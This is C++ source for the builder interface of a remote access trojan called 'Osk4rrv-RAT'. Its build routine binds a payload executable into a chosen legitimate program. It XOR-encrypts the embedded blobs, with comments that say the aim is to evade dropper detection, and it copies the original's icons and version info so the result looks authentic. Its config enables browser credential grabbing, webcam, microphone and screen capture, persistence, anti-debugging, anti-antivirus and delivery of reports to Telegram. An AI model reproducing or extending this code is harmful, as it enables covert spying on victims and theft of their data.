    if (drawChromeButton("##splash_min", ImVec2(p0.x + winSize.x - 78.0f, p0.y + 14.0f), false))
        requestMinimize = true;
    if (drawChromeButton("##splash_close", ImVec2(p0.x + winSize.x - 40.0f, p0.y + 14.0f), true))
        requestClose = true;

    // progress
    if (splashStartTime <= 0.0f)
        splashStartTime = (float)ImGui::GetTime();
    float t = ((float)ImGui::GetTime() - splashStartTime) / SPLASH_DURATION;
    if (t > 1.0f) t = 1.0f;
    // ease-out cubic
    float eased = 1.0f - (1.0f - t) * (1.0f - t) * (1.0f - t);
    splashProgress = eased;

    ImFont* big = fontSplash ? fontSplash : (fontHeading ? fontHeading : ImGui::GetFont());
    const char* title = "Osk4rrv-RAT";
    float titleSize = fontSplash ? fontSplash->LegacySize : 36.0f;
    ImVec2 titleSz = big->CalcTextSizeA(titleSize, FLT_MAX, 0.0f, title);
    float titleX = p0.x + (winSize.x - titleSz.x) * 0.5f;
    float titleY = p0.y + winSize.y * 0.38f;
    dl->AddText(big, titleSize, ImVec2(titleX, titleY), Ui::color(Ui::TextPrimary), title);

    // thin gold underline under title
    float lineW = 48.0f;
    float lineY = titleY + titleSz.y + 14.0f;
    dl->AddRectFilled(
        ImVec2(p0.x + (winSize.x - lineW) * 0.5f, lineY),
        ImVec2(p0.x + (winSize.x + lineW) * 0.5f, lineY + 2.0f),
        Ui::color(Ui::Accent),
        1.0f);

    // loading bar
    const float barW = 220.0f;
    const float barH = 3.0f;
    float barX = p0.x + (winSize.x - barW) * 0.5f;
    float barY = lineY + 28.0f;
    dl->AddRectFilled(ImVec2(barX, barY), ImVec2(barX + barW, barY + barH), Ui::color(Ui::SurfaceRaised), 2.0f);
    dl->AddRectFilled(ImVec2(barX, barY), ImVec2(barX + barW * splashProgress, barY + barH), Ui::color(Ui::Accent), 2.0f);

    // status text
    const char* phase = "Starting";
    if (splashProgress > 0.35f) phase = "Loading modules";
    if (splashProgress > 0.70f) phase = "Ready";
    ImFont* body = fontBody ? fontBody : ImGui::GetFont();
    float bodySize = body->LegacySize;
    ImVec2 phaseSz = body->CalcTextSizeA(bodySize, FLT_MAX, 0.0f, phase);
    dl->AddText(
        body,
        bodySize,
        ImVec2(p0.x + (winSize.x - phaseSz.x) * 0.5f, barY + 16.0f),
        Ui::color(Ui::TextMuted),
        phase);

    if (t >= 1.0f)
        showSplash = false;
}

struct BuildEntry {
    std::string name;
    std::string fullPath;
    FILETIME writeTime;
};

static std::string getBuildsDir();

static std::vector<BuildEntry> listLatestBuilds(int maxCount) {
    std::vector<BuildEntry> builds;
    const std::string dir = getBuildsDir();
    const std::string pattern = dir + "\\*.exe";
    WIN32_FIND_DATAA fd = {};
    HANDLE h = FindFirstFileA(pattern.c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE)
        return builds;
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            continue;
        if (strstr(fd.cFileName, ".stub.exe") != nullptr)
            continue;
        BuildEntry e;
        e.name = fd.cFileName;
        e.fullPath = dir + "\\" + fd.cFileName;
        e.writeTime = fd.ftLastWriteTime;
        builds.push_back(std::move(e));
    } while (FindNextFileA(h, &fd));
    FindClose(h);

    std::sort(builds.begin(), builds.end(), [](const BuildEntry& a, const BuildEntry& b) {
        return CompareFileTime(&a.writeTime, &b.writeTime) > 0;
    });
    if ((int)builds.size() > maxCount)
        builds.resize(maxCount);
    return builds;
}

static void openBuildLocation(const std::string& fullPath) {
    if (fullPath.empty())
        return;
    std::string params = "/select,\"" + fullPath + "\"";
    HINSTANCE r = ShellExecuteA(g_hwnd, "open", "explorer.exe", params.c_str(), nullptr, SW_SHOWNORMAL);
    if ((INT_PTR)r <= 32)
        ShellExecuteA(g_hwnd, "open", getBuildsDir().c_str(), nullptr, nullptr, SW_SHOWNORMAL);
}

static std::string formatBuildTime(const FILETIME& ft) {
    FILETIME localFt = {};
    SYSTEMTIME st = {};
    FileTimeToLocalFileTime(&ft, &localFt);
    FileTimeToSystemTime(&localFt, &st);
    char buf[64];
    snprintf(buf, sizeof(buf), "%02d-%02d-%04d %02d:%02d",
        st.wDay, st.wMonth, st.wYear, st.wHour, st.wMinute);
    return std::string(buf);
}

static void drawGeneralTab() {
    const float width = ImGui::GetWindowSize().x;
    drawPageHeader("Home", "Status and quick actions");

    ImGui::SetCursorPos(ImVec2(Ui::ContentPadding, 88.0f));
    ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(22.0f, 20.0f));
    ImGui::PushStyleColor(ImGuiCol_ChildBg, Ui::Surface);
    ImGui::PushStyleColor(ImGuiCol_Border, Ui::Border);
    if (ImGui::BeginChild(
            "##overview_connection",
            ImVec2(width - Ui::ContentPadding * 2.0f, 150.0f),
            ImGuiChildFlags_Borders,
            ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse)) {
        const ImVec2 panelPos = ImGui::GetWindowPos();
        const ImVec2 panelSize = ImGui::GetWindowSize();
        ImDrawList* dl = ImGui::GetWindowDrawList();
        const StatusPresentation status = getStatusPresentation();

        if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
        ImGui::TextUnformatted("Connection status");
        if (fontMedium) ImGui::PopFont();
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
        ImGui::TextUnformatted("Telegram delivery and local setup");
        ImGui::PopStyleColor();

        const ImVec2 statusTextSize = ImGui::CalcTextSize(status.label);
        const float statusX = panelPos.x + panelSize.x - 22.0f - statusTextSize.x;
        dl->AddCircleFilled(ImVec2(statusX - 11.0f, panelPos.y + 28.0f), 3.5f, Ui::color(status.color));
        dl->AddText(ImVec2(statusX, panelPos.y + 20.0f), Ui::color(Ui::TextSecondary), status.label);

        dl->AddLine(
            ImVec2(panelPos.x + 22.0f, panelPos.y + 67.0f),
            ImVec2(panelPos.x + panelSize.x - 22.0f, panelPos.y + 67.0f),
            Ui::color(Ui::Border));

        ImGui::SetCursorPos(ImVec2(22.0f, 82.0f));
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
        ImGui::TextUnformatted("Telegram delivery");
        ImGui::PopStyleColor();
        ImGui::SetCursorPos(ImVec2(panelSize.x - 22.0f - statusTextSize.x, 82.0f));
        ImGui::PushStyleColor(ImGuiCol_Text, status.color);
        ImGui::TextUnformatted(status.label);
        ImGui::PopStyleColor();

        const char* configLabel = configLoaded ? "Saved locally" : "Not configured";
        const ImVec2 configSize = ImGui::CalcTextSize(configLabel);
        ImGui::SetCursorPos(ImVec2(22.0f, 112.0f));
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
        ImGui::TextUnformatted("Bot configuration");
        ImGui::PopStyleColor();
        ImGui::SetCursorPos(ImVec2(panelSize.x - 22.0f - configSize.x, 112.0f));
        ImGui::PushStyleColor(ImGuiCol_Text, configLoaded ? Ui::TextSecondary : Ui::TextMuted);
        ImGui::TextUnformatted(configLabel);
        ImGui::PopStyleColor();
    }
    ImGui::EndChild();
    ImGui::PopStyleColor(2);
    ImGui::PopStyleVar();

    ImGui::SetCursorPos(ImVec2(Ui::ContentPadding, 254.0f));
    ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(18.0f, 14.0f));
    ImGui::PushStyleColor(ImGuiCol_ChildBg, Ui::Surface);
    ImGui::PushStyleColor(ImGuiCol_Border, Ui::Border);
    if (ImGui::BeginChild(
            "##overview_builds",
            ImVec2(width - Ui::ContentPadding * 2.0f, 168.0f),
            ImGuiChildFlags_Borders,
            ImGuiWindowFlags_None)) {
        if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
        ImGui::TextUnformatted("Latest builds");
        if (fontMedium) ImGui::PopFont();
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
        ImGui::TextUnformatted("Click a build to open its folder.");
        ImGui::PopStyleColor();
        ImGui::Dummy(ImVec2(0.0f, 6.0f));

        const std::vector<BuildEntry> builds = listLatestBuilds(6);
        if (builds.empty()) {
            ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
            ImGui::TextUnformatted("No builds yet.");
            ImGui::PopStyleColor();
        } else {
            const float cardW = 200.0f;
            const float cardH = 72.0f;
            const float gapX = 10.0f;
            const float gapY = 10.0f;
            const float availW = ImGui::GetContentRegionAvail().x;
            int perRow = (int)((availW + gapX) / (cardW + gapX));
            if (perRow < 1) perRow = 1;

            for (size_t i = 0; i < builds.size(); ++i) {
                const BuildEntry& b = builds[i];
                const std::string timeStr = formatBuildTime(b.writeTime);
                int col = (int)i % perRow;
                int row = (int)i / perRow;
                float cardX = col * (cardW + gapX);
                float cardY = row * (cardH + gapY);

                ImGui::SetCursorPos(ImVec2(cardX, cardY + 40.0f));
                char cardId[64];
                snprintf(cardId, sizeof(cardId), "##build_card_%zu", i);
                ImGui::PushStyleColor(ImGuiCol_ChildBg, Ui::SurfaceRaised);
                ImGui::PushStyleColor(ImGuiCol_Border, Ui::Border);
                ImGui::PushStyleColor(ImGuiCol_ChildBg, ImGui::IsItemHovered() ? Ui::SurfaceHover : Ui::SurfaceRaised);
                ImGui::PushStyleVar(ImGuiStyleVar_ChildRounding, 8.0f);
                ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(12.0f, 10.0f));
                if (ImGui::BeginChild(cardId, ImVec2(cardW, cardH), ImGuiChildFlags_Borders,
                        ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse)) {
                    ImDrawList* cdl = ImGui::GetWindowDrawList();
                    ImVec2 cp = ImGui::GetWindowPos();

                    cdl->AddRectFilled(
                        ImVec2(cp.x, cp.y),
                        ImVec2(cp.x + 3.0f, cp.y + cardH),
                        Ui::color(Ui::Accent), 2.0f);

                    if (fontBody) ImGui::PushFont(fontBody, fontBody->LegacySize);
                    ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextPrimary);
                    const char* dispName = b.name.c_str();
                    if (strlen(dispName) > 24) {
                        char truncated[28];
                        memcpy(truncated, dispName, 21);
                        strcpy(truncated + 21, "...");
                        ImGui::TextUnformatted(truncated);
                    } else {
                        ImGui::TextUnformatted(dispName);
                    }
                    ImGui::PopStyleColor();
                    if (fontBody) ImGui::PopFont();

                    ImGui::Dummy(ImVec2(0.0f, 2.0f));

                    ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
                    ImGui::TextUnformatted(timeStr.c_str());
                    ImGui::PopStyleColor();

                    ImGui::Dummy(ImVec2(0.0f, 2.0f));

                    char sidLabel[80];
                    snprintf(sidLabel, sizeof(sidLabel), "Session: %s", sessionId.c_str());
                    ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
                    ImGui::TextUnformatted(sidLabel);
                    ImGui::PopStyleColor();
                }
                ImGui::EndChild();
                ImGui::PopStyleVar(2);
                ImGui::PopStyleColor(3);

                if (ImGui::IsItemHovered() && ImGui::IsMouseClicked(ImGuiMouseButton_Left))
                    openBuildLocation(b.fullPath);
            }
        }
    }
    ImGui::EndChild();
    ImGui::PopStyleColor(2);
    ImGui::PopStyleVar();
}

static std::string generateRandomCode(int length) {
    static constexpr char alphabet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    std::random_device random;
    std::uniform_int_distribution<size_t> pick(0, sizeof(alphabet) - 2);
    std::string code;
    code.reserve(length);
    for (int i = 0; i < length; ++i)
        code.push_back(alphabet[pick(random)]);
    return code;
}

static std::string generateUniqueCode(int length) {
    static std::set<std::string> usedCodes;
    std::string code;
    do {
        code = generateRandomCode(length);
    } while (usedCodes.count(code) > 0);
    usedCodes.insert(code);
    return code;
}

static std::string getCurrentDate() {
    std::time_t now = std::time(nullptr);
    std::tm* localTime = std::localtime(&now);
    char buf[32];
    std::strftime(buf, sizeof(buf), "%d-%m-%Y", localTime);
    return std::string(buf);
}

static std::string getBuildsDir() {
    char path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, path))) {
        std::string dir = std::string(path) + "\\AppDataCfg\\builds";
        CreateDirectoryA(dir.c_str(), nullptr);
        return dir;
    }
    return "builds";
}

static void openExeFileDialog() {
    OPENFILENAMEA ofn = {};
    char filePath[MAX_PATH] = "";
    ofn.lStructSize = sizeof(ofn);
    ofn.hwndOwner = g_hwnd;
    ofn.lpstrFilter = "Executable files (*.exe)\0*.exe\0All files (*.*)\0*.*\0";
    ofn.lpstrFile = filePath;
    ofn.nMaxFile = MAX_PATH;
    ofn.Flags = OFN_FILEMUSTEXIST | OFN_PATHMUSTEXIST;
    ofn.lpstrTitle = "Select .exe file";
    if (GetOpenFileNameA(&ofn)) {
        strncpy_s(selectedExePath, filePath, MAX_PATH - 1);
        const char* fileName = strrchr(filePath, '\\');
        if (fileName)
            strncpy_s(selectedExeName, fileName + 1, MAX_PATH - 1);
        else
            strncpy_s(selectedExeName, filePath, MAX_PATH - 1);
    }
}

static std::vector<char> readFileBytes(const std::string& path) {
    std::vector<char> data;
    HANDLE h = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return data;
    LARGE_INTEGER li = {};
    if (!GetFileSizeEx(h, &li) || li.QuadPart <= 0 || li.QuadPart > 0x7FFFFFFF) {
        CloseHandle(h);
        return data;
    }
    data.resize(static_cast<size_t>(li.QuadPart));
    DWORD read = 0;
    size_t off = 0;
    while (off < data.size()) {
        DWORD chunk = 0;
        DWORD toRead = (DWORD)std::min<size_t>(data.size() - off, 8 * 1024 * 1024);
        if (!ReadFile(h, data.data() + off, toRead, &chunk, nullptr) || chunk == 0)
            break;
        off += chunk;
        read += chunk;
    }
    CloseHandle(h);
    if (off != data.size())
        data.clear();
    return data;
}

static bool writeFileBytes(const std::string& path, const std::vector<char>& data) {
    HANDLE h = CreateFileA(path.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return false;
    size_t off = 0;
    while (off < data.size()) {
        DWORD written = 0;
        DWORD toWrite = (DWORD)std::min<size_t>(data.size() - off, 8 * 1024 * 1024);
        if (!WriteFile(h, data.data() + off, toWrite, &written, nullptr) || written == 0) {
            CloseHandle(h);
            return false;
        }
        off += written;
    }
    CloseHandle(h);
    return true;
}

static bool pathFileExists(const std::string& path) {
    DWORD a = GetFileAttributesA(path.c_str());
    return a != INVALID_FILE_ATTRIBUTES && !(a & FILE_ATTRIBUTE_DIRECTORY);
}

// Copy RT_ICON / RT_GROUP_ICON (and version info) from source PE into dest PE
struct IconCopyCtx {
    HMODULE hSrc;
    HANDLE hUpdate;
    bool ok;
};

static BOOL CALLBACK enumIconRes(HMODULE hMod, LPCWSTR type, LPWSTR name, LONG_PTR lParam) {
    IconCopyCtx* ctx = (IconCopyCtx*)lParam;
    HRSRC hRes = FindResourceW(hMod, name, type);
    if (!hRes) return TRUE;
    HGLOBAL hData = LoadResource(hMod, hRes);
    if (!hData) return TRUE;
    void* p = LockResource(hData);
    DWORD size = SizeofResource(hMod, hRes);
    if (!p || !size) return TRUE;
    if (!UpdateResourceW(ctx->hUpdate, type, name, MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), p, size))
        ctx->ok = false;
    return TRUE;
}

static bool copyPeIcons(const char* srcExe, const char* destExe) {
    if (!srcExe || !srcExe[0] || !destExe || !destExe[0]) return false;
    HMODULE hSrc = LoadLibraryExA(srcExe, nullptr, LOAD_LIBRARY_AS_DATAFILE | LOAD_LIBRARY_AS_IMAGE_RESOURCE);
    if (!hSrc) return false;
    HANDLE hUpdate = BeginUpdateResourceA(destExe, FALSE);
    if (!hUpdate) {
        FreeLibrary(hSrc);
        return false;
    }
    IconCopyCtx ctx{ hSrc, hUpdate, true };
    EnumResourceNamesW(hSrc, RT_ICON, enumIconRes, (LONG_PTR)&ctx);
    EnumResourceNamesW(hSrc, RT_GROUP_ICON, enumIconRes, (LONG_PTR)&ctx);
    // Optional: version resource for more authentic look
    EnumResourceNamesW(hSrc, RT_VERSION, enumIconRes, (LONG_PTR)&ctx);
    BOOL endOk = EndUpdateResourceA(hUpdate, FALSE);
    FreeLibrary(hSrc);
    return endOk && ctx.ok;
}

static void performBuild() {
    buildStatusMsg[0] = 0;
    std::string buildsDir = getBuildsDir();

    char exePath[MAX_PATH];
    GetModuleFileNameA(nullptr, exePath, MAX_PATH);
    std::string exeStr(exePath);
    size_t lastSlash = exeStr.rfind('\\');
    std::string exeDir = (lastSlash != std::string::npos) ? exeStr.substr(0, lastSlash) : ".";
    std::string payloadPath = exeDir + "\\payload.exe";
    std::string binderPath = exeDir + "\\binder.exe";

    if (!pathFileExists(payloadPath) || !pathFileExists(binderPath)) {
        snprintf(buildStatusMsg, sizeof(buildStatusMsg),
            "Missing payload.exe or binder.exe next to builder:\n%s", exeDir.c_str());
        return;
    }
    if (strlen(selectedExePath) == 0 || !pathFileExists(selectedExePath)) {
        snprintf(buildStatusMsg, sizeof(buildStatusMsg),
            "Select a valid original .exe first (Browse).");
        return;
    }

    if (micDurationSec < 1) micDurationSec = 1;
    if (micDurationSec > 600) micDurationSec = 600;
    if (webcamDurationSec < 1) webcamDurationSec = 1;
    if (webcamDurationSec > 600) webcamDurationSec = 600;
    if (screenDurationSec < 1) screenDurationSec = 1;
    if (screenDurationSec > 600) screenDurationSec = 600;

    std::string baseName = "build";
    if (strlen(selectedExeName) > 0) {
        baseName = selectedExeName;
        size_t dotPos = baseName.rfind('.');
        if (dotPos != std::string::npos)
            baseName = baseName.substr(0, dotPos);
    }
    // sanitize base name for filesystem
    for (char& c : baseName) {
        if (c == '<' || c == '>' || c == ':' || c == '"' || c == '/' || c == '\\' || c == '|' || c == '?' || c == '*')
            c = '_';
    }
    if (baseName.empty())
        baseName = "build";

    std::string destExe = buildsDir + "\\" + baseName + "-" + sessionId + ".exe";
    std::string destConfig = buildsDir + "\\" + baseName + "-" + sessionId + ".ini";
    std::string stubPath = buildsDir + "\\" + baseName + "-" + sessionId + ".stub.exe";

    std::ofstream cfgFile(destConfig);
    if (cfgFile.is_open()) {
        cfgFile << "bot_token=" << botTokenBuf << "\n";
        cfgFile << "chat_id=" << chatIdBuf << "\n";
        cfgFile << "session_id=" << sessionId << "\n";
        cfgFile << "update_interval=" << updateIntervalDays << "\n";
        cfgFile << "opt_grab_browser=" << (buildOptions[0] ? 1 : 0) << "\n";
        cfgFile << "opt_screenshot=" << (buildOptions[1] ? 1 : 0) << "\n";
        cfgFile << "opt_autostart=" << (buildOptions[2] ? 1 : 0) << "\n";
        cfgFile << "opt_grab_webcam=" << (buildOptions[3] ? 1 : 0) << "\n";
        cfgFile << "opt_grab_microphone=" << (buildOptions[4] ? 1 : 0) << "\n";
        cfgFile << "opt_bypass_vt=" << (buildOptions[5] ? 1 : 0) << "\n";
        cfgFile << "opt_stealth=" << (buildOptions[6] ? 1 : 0) << "\n";
        cfgFile << "opt_persistence=" << (buildOptions[7] ? 1 : 0) << "\n";
        cfgFile << "opt_anti_debug=" << (buildOptions[8] ? 1 : 0) << "\n";
        cfgFile << "opt_encrypt_traffic=" << (buildOptions[9] ? 1 : 0) << "\n";
        cfgFile << "opt_anti_av=" << (buildOptions[10] ? 1 : 0) << "\n";
        cfgFile << "mic_duration_sec=" << micDurationSec << "\n";
        cfgFile << "webcam_duration_sec=" << webcamDurationSec << "\n";
        cfgFile << "screen_duration_sec=" << screenDurationSec << "\n";
        // keep original name so binder/payload can report it
        cfgFile << "original_name=" << selectedExeName << "\n";
        cfgFile.close();
    }

    // Read blobs first so we fail early with clear sizes
    std::vector<char> binderData = readFileBytes(binderPath);
    std::vector<char> payloadData = readFileBytes(payloadPath);
    std::vector<char> originalData = readFileBytes(selectedExePath);
    std::vector<char> configData = readFileBytes(destConfig);

    if (binderData.empty() || payloadData.empty() || originalData.empty()) {
        snprintf(buildStatusMsg, sizeof(buildStatusMsg),
            "Failed to read files.\nbinder=%zu payload=%zu original=%zu\norig path: %s",
            binderData.size(), payloadData.size(), originalData.size(), selectedExePath);
        return;
    }

    // Embed data as PE resources (no overlay) to avoid binder/dropper detection.
    // Write binder stub to destExe, then use UpdateResource to embed icons + encrypted blobs.
    if (!writeFileBytes(destExe, binderData)) {
        snprintf(buildStatusMsg, sizeof(buildStatusMsg), "Failed to write stub: %s", destExe.c_str());
        return;
    }

    // Generate random XOR key
    BYTE xorKey = (BYTE)(GetTickCount() & 0xFF);
    if (xorKey == 0) xorKey = 0xA7;

    // XOR-encrypt blobs so embedded PE headers aren't visible in resource section
    for (size_t i = 0; i < originalData.size(); i++) originalData[i] ^= (char)xorKey;
    for (size_t i = 0; i < payloadData.size(); i++) payloadData[i] ^= (char)xorKey;
    for (size_t i = 0; i < configData.size(); i++) configData[i] ^= (char)xorKey;

    // Open destExe for resource update
    HANDLE hUpdate = BeginUpdateResourceA(destExe.c_str(), FALSE);
    if (!hUpdate) {
        snprintf(buildStatusMsg, sizeof(buildStatusMsg), "BeginUpdateResource failed: err=%lu", GetLastError());
        return;
    }

    // Copy icons from original EXE
    HMODULE hSrc = LoadLibraryExA(selectedExePath, nullptr, LOAD_LIBRARY_AS_DATAFILE | LOAD_LIBRARY_AS_IMAGE_RESOURCE);
    if (hSrc) {
        IconCopyCtx ctx{ hSrc, hUpdate, true };
        EnumResourceNamesW(hSrc, RT_ICON, enumIconRes, (LONG_PTR)&ctx);
        EnumResourceNamesW(hSrc, RT_GROUP_ICON, enumIconRes, (LONG_PTR)&ctx);
        EnumResourceNamesW(hSrc, RT_VERSION, enumIconRes, (LONG_PTR)&ctx);
        FreeLibrary(hSrc);
    }

    // Embed encrypted blobs as RCDATA resources
    auto embedRes = [&](WORD id, const void* data, DWORD size) -> bool {
        return UpdateResourceW(hUpdate, RT_RCDATA, MAKEINTRESOURCEW(id),
            MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), (void*)data, size) != 0;
    };

    bool resOk = true;
    if (!embedRes(101, originalData.data(), (DWORD)originalData.size())) resOk = false;
    if (!embedRes(102, payloadData.data(), (DWORD)payloadData.size())) resOk = false;
    if (!configData.empty()) {
        if (!embedRes(103, configData.data(), (DWORD)configData.size())) resOk = false;
    }
    if (!embedRes(104, &xorKey, 1)) resOk = false;

    BOOL endOk = EndUpdateResourceA(hUpdate, FALSE);

    if (!endOk || !resOk) {
        DeleteFileA(destExe.c_str());
        snprintf(buildStatusMsg, sizeof(buildStatusMsg), "Failed to embed resources in: %s", destExe.c_str());
        return;
    }

    // Clean up temp stub file if it exists
    DeleteFileA(stubPath.c_str());

    LARGE_INTEGER finalSize = {};
    HANDLE hCheck = CreateFileA(destExe.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hCheck != INVALID_HANDLE_VALUE) {
        GetFileSizeEx(hCheck, &finalSize);
        CloseHandle(hCheck);
    }

    snprintf(buildStatusMsg, sizeof(buildStatusMsg),
        "Build OK: %s\nsize=%lld bytes\noriginal=%zu | payload=%zu | config=%zu\nname: %s",
        destExe.c_str(),
        finalSize.QuadPart,
        originalData.size(),
        payloadData.size(),
        configData.size(),
        selectedExeName[0] ? selectedExeName : "(none)");

    ShellExecuteA(g_hwnd, "open", buildsDir.c_str(), nullptr, nullptr, SW_SHOWNORMAL);
}


static void sendTestHit() {
    std::string code4 = generateUniqueCode(4);
    std::string password = generateRandomCode(8);
    std::string date = getCurrentDate();

    std::string msg;
    msg += "[Notification] Session: " + sessionId + "\n";
    msg += "\n";
    msg += "File name opened: test.exe\n";
    msg += "\n";
    msg += "\xF0\x9F\x93\x84Quick information:\n";
    msg += "PC Name: No information (test)\n";
    msg += "IP: No information (test)\n";
    msg += "CPU: No information (test)\n";
    msg += "GPU: No information (test)\n";
    msg += "\n";
    msg += std::string("\xF0\x9F\x93\x81") + "Download .rar file: hit" + date + "-" + code4 + ".rar\n";
    msg += "Password (random): " + password;

    std::string rarFileName = "hit" + date + "-" + code4 + ".rar";

    static const char rarSignature[] = { 0x52, 0x61, 0x72, 0x21, 0x1A, 0x07, 0x01, 0x00 };
    std::vector<char> rarData(rarSignature, rarSignature + sizeof(rarSignature));

    lastTestMessage = msg;
    telegram.sendDocumentAsync(msg, rarFileName, rarData);
}

static void closeBuildWizard(bool goHome) {
    showBuildPopup = false;
    buildWizardStep = 0;
    buildWizardStepFrom = 0;
    buildWizardStepAnim = 1.0f;
    if (goHome)
        currentTab = 0; // overview
    buildStatusMsg[0] = '\0';
}

static void goBuildWizardStep(int step) {
    if (step == buildWizardStep)
        return;
    buildWizardStepFrom = buildWizardStep;
    buildWizardStep = step;
    buildWizardStepAnim = 0.0f;
}

// Full-window builder (like splash): flat content, no card/modal.
static void iconText(const char* icon, const char* label) {
    if (fontIcons) {
        ImGui::PushFont(fontIcons, fontIcons->LegacySize);
        ImGui::TextUnformatted(icon);
        ImGui::PopFont();
        ImGui::SameLine(0.0f, 8.0f);
    }
    ImGui::TextUnformatted(label);
}

static void drawBuildPopup() {
    if (!showBuildPopup && buildWizardAnim < 0.001f)
        return;

    const float dt = ImGui::GetIO().DeltaTime;
    const float animTarget = showBuildPopup ? 1.0f : 0.0f;
    const float animStep = 1.0f - std::exp(-11.0f * dt);
    buildWizardAnim += (animTarget - buildWizardAnim) * animStep;
    if (!showBuildPopup && buildWizardAnim < 0.01f) {
        buildWizardAnim = 0.0f;
        buildWizardStep = 0;
        buildWizardStepAnim = 1.0f;
        buildWizardStepFrom = 0;
        return;
    }
    if (showBuildPopup && buildWizardAnim > 0.999f)
        buildWizardAnim = 1.0f;

    buildWizardStepAnim += (1.0f - buildWizardStepAnim) * (1.0f - std::exp(-14.0f * dt));
    if (buildWizardStepAnim > 0.999f)
        buildWizardStepAnim = 1.0f;

    const float openEase = 1.0f - (1.0f - buildWizardAnim) * (1.0f - buildWizardAnim) * (1.0f - buildWizardAnim);
    const float stepEase = 1.0f - (1.0f - buildWizardStepAnim) * (1.0f - buildWizardStepAnim);

    const ImVec2 winSize = ImGui::GetWindowSize();
    const ImVec2 p0 = ImGui::GetWindowPos();
    ImDrawList* dl = ImGui::GetWindowDrawList();

    dl->AddRectFilled(p0, ImVec2(p0.x + winSize.x, p0.y + winSize.y), Ui::color(Ui::Canvas), 10.0f);

    // Drag only top strip (not chrome buttons)
    handleWindowDrag(p0, ImVec2(winSize.x - 88.0f, 48.0f));

    const float stepDir = (buildWizardStep >= buildWizardStepFrom) ? 1.0f : -1.0f;
    const float stepSlide = (1.0f - stepEase) * 20.0f * stepDir;
    const float fadeInY = (1.0f - openEase) * 12.0f;

    const float padL = 28.0f + stepSlide;
    const float padR = 28.0f;
    const float topY = 22.0f + fadeInY;
    const float footerH = 64.0f;
    const float contentW = winSize.x - padL - padR;

    const float contentAlpha = (openEase < 0.2f) ? 0.2f : openEase;
    const float stepAlpha = (stepEase < 0.25f) ? 0.25f : stepEase;
    ImGui::PushStyleVar(ImGuiStyleVar_Alpha, contentAlpha * stepAlpha);

    // ================= SUCCESS =================
    if (buildWizardStep == 2) {
        const char* title = "Success";
        const char* sub = "Your build is ready.";
        ImFont* big = fontHeading ? fontHeading : ImGui::GetFont();
        float titleSz = big->LegacySize + 6.0f;
        ImVec2 titleMs = big->CalcTextSizeA(titleSz, FLT_MAX, 0.0f, title);
        ImFont* body = fontBody ? fontBody : ImGui::GetFont();
        float bodySz = body->LegacySize;
        ImVec2 subMs = body->CalcTextSizeA(bodySz, FLT_MAX, 0.0f, sub);

        // centered icon + text block
        float blockH = 56.0f + titleMs.y + 10.0f + subMs.y;
        float blockY = p0.y + (winSize.y - blockH - footerH) * 0.5f;

        if (fontIcons) {
            ImGui::PushFont(fontIcons, 42.0f);
            ImVec2 iconMs = fontIcons->CalcTextSizeA(42.0f, FLT_MAX, 0.0f, ICON_FA_CIRCLE_CHECK);
            dl->AddText(
                fontIcons,
                42.0f,
                ImVec2(p0.x + (winSize.x - iconMs.x) * 0.5f, blockY),
                Ui::color(Ui::Success),
                ICON_FA_CIRCLE_CHECK);
            ImGui::PopFont();
            blockY += 56.0f;
        }

        dl->AddText(
            big,
            titleSz,
            ImVec2(p0.x + (winSize.x - titleMs.x) * 0.5f, blockY),
            Ui::color(Ui::TextPrimary),
            title);
        blockY += titleMs.y + 10.0f;
        dl->AddText(
            body,
            bodySz,
            ImVec2(p0.x + (winSize.x - subMs.x) * 0.5f, blockY),
            Ui::color(Ui::TextMuted),
            sub);

        // Continue centered bottom
        const float contW = 140.0f;
        const float btnH = 38.0f;
        ImGui::SetCursorPos(ImVec2((winSize.x - contW) * 0.5f, winSize.y - footerH + 10.0f));
        char contLabel[64];
        snprintf(contLabel, sizeof(contLabel), "%s  Continue", ICON_FA_ARROW_RIGHT);
        if (styledButton(contLabel, ImVec2(contW, btnH), true))
            closeBuildWizard(false);
    }
    // ================= STEP 0 / 1 =================
    else {
        // Title top-left
        ImGui::SetCursorPos(ImVec2(padL, topY));
        if (fontHeading) ImGui::PushFont(fontHeading, fontHeading->LegacySize);
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextPrimary);
        if (buildWizardStep == 0)
            iconText(ICON_FA_FILE, "Select an .exe file");
        else
            iconText(ICON_FA_SLIDERS, "Build options");
        ImGui::PopStyleColor();
        if (fontHeading) ImGui::PopFont();

        ImGui::SetCursorPosX(padL);
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
        ImGui::TextUnformatted(
            buildWizardStep == 0
                ? "Choose the original executable to package."
                : "Pick features, capture durations and update interval.");
        ImGui::PopStyleColor();

        // body: mid-left content
        const float bodyTop = 96.0f + fadeInY;
